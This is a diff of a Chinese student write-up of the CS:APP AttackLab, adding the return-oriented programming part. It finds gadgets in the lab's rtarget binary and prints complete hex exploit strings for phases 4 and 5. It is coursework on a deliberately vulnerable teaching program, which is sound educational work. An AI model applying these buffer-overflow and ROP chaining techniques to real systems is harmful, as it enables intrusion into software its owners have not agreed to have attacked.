@@ -1,5 +1,21 @@
 # 实验3：AttackLab
 
+- [实验3：AttackLab](#%E5%AE%9E%E9%AA%8C3attacklab)
+  * [Part I: Code Injection Attacks](#part-i-code-injection-attacks)
+    + [Level 1](#level-1)
+      - [test函数](#test%E5%87%BD%E6%95%B0)
+      - [getbuf函数](#getbuf%E5%87%BD%E6%95%B0)
+    + [level 2](#level-2)
+      - [touch2函数](#touch2%E5%87%BD%E6%95%B0)
+    + [lever 3](#lever-3)
+      - [touch3函数](#touch3%E5%87%BD%E6%95%B0)
+  * [Part II: Return-Oriented Programming](#part-ii-return-oriented-programming)
+    + [lever 2](#lever-2)
+      - [**方案1：**直接弹给rdi](#%E6%96%B9%E6%A1%881%E7%9B%B4%E6%8E%A5%E5%BC%B9%E7%BB%99rdi)
+      - [**方案2：**找一个寄存器暂存，然后存入rdi](#%E6%96%B9%E6%A1%882%E6%89%BE%E4%B8%80%E4%B8%AA%E5%AF%84%E5%AD%98%E5%99%A8%E6%9A%82%E5%AD%98%E7%84%B6%E5%90%8E%E5%AD%98%E5%85%A5rdi)
+    + [lever 3](#lever-3-1)
+    + [参考材料](#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99)
+
 先看一下attackLab.pdf，里面有哪些重要的信息
 
 **首先是HEX2RAW工具**
@@ -392,3 +408,248 @@ rsp栈帧执行的操作为
 最后验证结果通过
 
 ![image-20211030120524060](实验3：AttackLab.assets/image-20211030120524060.png)
+
+## Part II: Return-Oriented Programming
+
+> • It uses randomization so that the stack positions differ from one run to another. This makes it impos-sible to determine where your injected code will be located.
+> • It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.
+
+* 随机化，栈帧位置每次运行不同，不可能确定注入位置
+* 限制了可执行代码区域
+
+具体解释可以看下面的截图（截图来自于hit的csapp第三章ppt）
+
+![img](实验3：AttackLab.assets/v2-f9a6c721d439ad26bfbedd91e29d976e_b-16355787033573.jpg)
+
+ROP方式，把栈中放上很多地址，而每次ret都会到一个Gadget（小的代码片段，并且会ret），这样就可以形成一个程序链。通过将程序自身(`./rtarget`)的指令来完成我们的目的。
+
+![image-20211030150555348](实验3：AttackLab.assets/image-20211030150555348.png)
+
+### lever 2
+
+> For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).
+
+对于第4阶段，您将重复第2阶段的攻击，但使用来自您的小工具的程序RTARGET进行此攻击。 您可以使用由以下指令类型组成的小工具（gadgets）来构造解决方案，并且仅使用前八个x86-64寄存器（％rax–％rdi）。
+
+> movq : The codes for these are shown in Figure 3A.
+> popq : The codes for these are shown in Figure 3B.
+> ret : This instruction is encoded by the single byte 0xc3.
+> nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single
+> byte 0x90. Its only effect is to cause the program counter to be incremented by 1.
+
+![image-20211030153621136](实验3：AttackLab.assets/image-20211030153621136.png)
+
+**一些建议：**
+
+> • All the gadgets you need can be found in the region of the code for rtarget demarcated by the
+> functions start_farm and mid_farm.
+> • You can do this attack with just two gadgets.
+> • When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit
+> string will contain a combination of gadget addresses and data.
+
+**案例：**
+
+![img](实验3：AttackLab.assets/v2-9ec2a26487ce7a31db7602300be9ff20_b.jpg)
+
+
+
+首先明确lever2的任务，
+
+1. 将%rdi设置为cookie
+2. 执行touch2
+
+符合要求的汇编代码如下
+
+```assembly
+pushq  $0x4017ec
+mov    $0x59b997fa,%edi
+ret
+```
+
+由于源汇编代码并不存在`pushq  $0x4017ec`和`mov    $0x59b997fa,%edi`所以只能通过工具构造。
+
+**整个流程是遇到ret，进行弹栈，找到pop位置，将地址存入rdi寄存器，执行c3弹栈，跳转到下一个地址操作。然后用mov将寄存器内容存入rdi，执行c3弹栈跳转到touch2起始位置。**
+
+#### **方案1：**直接弹给rdi
+
+```assembly
+pop rdi
+ret #touch2
+```
+
+这个方案比较简单，找到`5f c0`即可，查找源码在这一段找到了相关字节码。
+
+```assembly
+  402b18:	41 5f                	pop    %r15
+  402b1a:	c3                   	retq  
+```
+
+地址为`0x402b19`
+
+最终栈帧结构如下图
+
+![image-20211030163806317](实验3：AttackLab.assets/image-20211030163806317.png)
+
+答案为：
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+19 2b 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+验证通过
+
+![image-20211030164011309](实验3：AttackLab.assets/image-20211030164011309.png)
+
+> 注：实际上这个方案并不在建议给的条件内，即用两个gadgets，在start_farm和end_fram范围内。
+
+#### **方案2：**找一个寄存器暂存，然后存入rdi
+
+通过查找可行的字节码，遍历查找红框下所有可能数据
+
+![image-20211030161517763](实验3：AttackLab.assets/image-20211030161517763.png)
+
+![image-20211030161820811](实验3：AttackLab.assets/image-20211030161820811.png)
+
+找到了这段字节码，后面紧跟着c3，执行ret操作。符合条件，故拟定以下操作。
+
+```assembly
+pop rax
+mov rax rdi
+ret  #touch2
+```
+
+首先是找到addval_2代码
+
+```assembly
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+```
+
+重点在`58 90 c3`这段，先进行``pop rax`， 然后90是一个nop操作，最后c3执行ret弹栈。位置是`0x4019ab`
+
+然后是addval_273这段
+
+```assembly
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+```
+
+`48 89 c7 c3`进行`mov rax rdi`，最后ret。地址为`0x4019a2`
+
+最终栈结构如图
+
+![image-20211030162640759](实验3：AttackLab.assets/image-20211030162640759.png)
+
+最终答案为
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+验证通过
+
+![image-20211030163131955](实验3：AttackLab.assets/image-20211030163131955.png)
+
+### lever 3
+
+最后一个看介绍都感觉很难，果断参考答案来做。
+**addval_190**
+
+```assembly
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq   
+
+```
+
+```assembly
+0x401a06 48 89 e0    #movq %rsp,%rax
+0x401a09 c3          #ret
+```
+
+**setval_426**
+
+```assembly
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+```
+
+```assembly
+0x4019c5 48 89 c7     #movq %rax,%rdi
+0x4019c8 90           #nop
+0x4019c9 c3           #ret 
+```
+
+**add_xy**
+
+```assembly
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq  
+```
+
+```assembly
+0x4019d8 04 37   #add 0x37.al
+0x4019da c3      #ret   
+```
+
+**最终结果：**
+
+```assembly
+// address is 0x401a06,execute a part of addval_190
+movq %rsp,%rax
+ret
+//address is ox4019d8,execute a part of add_xy
+add 0x37,%al
+ret
+//address is 0x4019c5,execute a part of addval_426
+movq %rax,%rdi
+ret
+```
+
+
+由上，可以知道攻击序列为
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00
+d8 19 40 00 00 00 00 00
+c5 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 35
+39 62 39 39 37 66 61 00
+```
+
+![image-20211030171328659](实验3：AttackLab.assets/image-20211030171328659.png)
+
+### 参考材料
+
+[图文并茂-超详解 CS:APP: Lab3-Attack（附带栈帧分析）](https://zhuanlan.zhihu.com/p/339802171)
+
+[深入理解计算机系统attack lab](https://blog.csdn.net/weixin_41256413/article/details/80463280)
+
